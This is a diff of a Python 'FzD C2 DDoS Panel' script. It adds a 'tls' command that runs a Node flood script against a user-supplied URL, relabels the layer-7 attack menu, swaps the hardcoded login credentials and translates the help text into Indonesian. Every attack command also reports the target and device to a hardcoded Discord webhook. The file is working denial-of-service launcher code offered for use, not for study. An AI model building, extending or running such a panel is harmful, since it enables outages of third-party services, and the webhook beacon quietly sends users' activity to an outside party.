@@ -72,8 +72,8 @@ def layer7():
              ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
              ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
              ║  ► crash            ║ L ║  ► https-spoof      ║ L ║  ► dandier          ║
-             ║  ► hyper            ║   ║  ► killer           ║   ║  ► soon             ║
-             ║  ► slow             ║   ║  ► soon             ║   ║  ► soon             ║
+             ║  ► hyper            ║   ║  ► killer           ║   ║  ► tlsvip           ║
+             ║  ► slow             ║   ║  ► flood            ║   ║  ► stress           ║
              ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
 ''')
 
@@ -107,16 +107,19 @@ def menu():
      print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to FzD C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: FzD Team \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1\x1b[38;2;0;255;255m | \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m]') 
      print("") 
      print(""" 
-                        \x1b[38;2;0;212;14m░▐█▀▀\x1b[38;2;0;186;45m▒▐█▀▀▀█▌\x1b[38;2;0;150;88m░▐█▀█▄\x1b[38;2;0;113;133m░▐█▀█▄\x1b[38;2;0;83;168m▒▐█▀▀█▌\x1b[38;2;0;49;147m▒▄█▀▀█ 
-                        \x1b[38;2;0;212;14m░▐█▀▀\x1b[38;2;0;186;45m░▒▄▄█▀▀░\x1b[38;2;0;150;88m░▐█▌▐█\x1b[38;2;0;113;133m░▐█▌▐█\x1b[38;2;0;83;168m▒▐█▄▒█▌\x1b[38;2;0;49;147m▒▀▀█▄▄ 
-                        \x1b[38;2;0;212;14m░▐█──\x1b[38;2;0;186;45m▒▐█▄▄▄█▌\x1b[38;2;0;150;88m░▐█▄█▀\x1b[38;2;0;113;133m░▐█▄█▀\x1b[38;2;0;83;168m▒▐██▄█▌\x1b[38;2;0;49;147m▒█▄▄█▀ 
+                        \x1b[38;2;0;212;14m░    ______          __   _________      
+                                               / ____/___  ____/ /  / ____/__ \     
+                                              / /_  /_  / / __  /  / /    __/ /     
+                                             / __/   / /_/ /_/ /  / /___ / __/      
+                                            /_/     /___/\__,_/   \____//____/      
+                                        
   
                  \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗ 
                  \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to FZD C2 DDoS Panel        \x1b[38;2;0;49;147m║ 
                  \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - -  \x1b[38;2;239;239;239mPrivate DDoS Panel 2023\x1b[38;2;0;212;14m - - - - - \x1b[38;2;0;49;147m║ 
                  \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝ 
                      \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗ 
-                     \x1b[38;2;0;212;14m║\x1b[38;2;239;239;239mhttps://github.com/177Members/ZxCDDoS \x1b[38;2;0;49;147m║  
+                     \x1b[38;2;0;212;14m║\x1b[38;2;239;239;239m This is an private toold cant be sell \x1b[38;2;0;49;147m                                                      ║  
                      \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝ 
                  \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗ 
                  \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239m   Type help to see the all commands.      \x1b[38;2;0;49;147m║ 
@@ -329,16 +332,16 @@ def main():
                 print('Usage: http-raw <url> <time>')
                 print('Example: http-raw http://example.com 60')
 
-        elif "http-requests" in cnc:
+        elif "tls" in cnc:
             try:
                 url = cnc.split()[1]
-                time = cnc.split()[2]
+                thread = cnc.split()[2]
                 device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-REQUEST\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'node HTTP-REQUESTS {url} {time}')
+                send_discord_webhook(webhook_url, f"\n\n---------------\nTLS\n---------------\nTarget: {url}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
+                os.system(f'node tls.js {url} {thread}')
             except IndexError:
-                print('Usage: http-requests <url> <time>')
-                print('Example: http-requests http://example.org 60')
+                print('Usage: tls <url> <thread>')
+                print('Example: tls http://example.org 120')
 
         elif "http-rand" in cnc:
             try:
@@ -523,10 +526,10 @@ def main():
 
         elif "help" in cnc:
             print(f'''
-LAYER7  ► SHOW LAYER7 METHODS
-LAYER4  ► SHOW LAYER4 METHODS
-PORTS   ► SHOW ALL PORTS
-TOOLS   ► SHOW TOOLS
+LAYER7  ► MENAMPILKAN METHODE LAYER7
+LAYER4  ► MENAMPILKAN METHODE LAYER4
+PORTS   ► MENAMPILKAN SEMUA PORT
+TOOLS   ► MENAMPILKAN TOOLS
             ''')
 
         else:
@@ -540,16 +543,16 @@ webhook_url = "https://discord.com/api/webhooks/1120049356687560726/HCEGcv4uqlTu
 
 def login(): 
      clear() 
-     user = "botnet" 
-     passwd = "botnet" 
+     user = "password" 
+     passwd = "username" 
      username = input("⚡ Username: ") 
      password = getpass.getpass(prompt='⚡ Password: ') 
      if username != user or password != passwd: 
          print("") 
-         print("⚡ You Poor Bitches.") 
+         print("⚡ Password Kamu salah!") 
          sys.exit(1) 
      elif username == user and password == passwd: 
-         print("⚡ Welcome Bro To FzD C2!") 
+         print("⚡ Welcome To FzD C2") 
          main() 
      
 login()
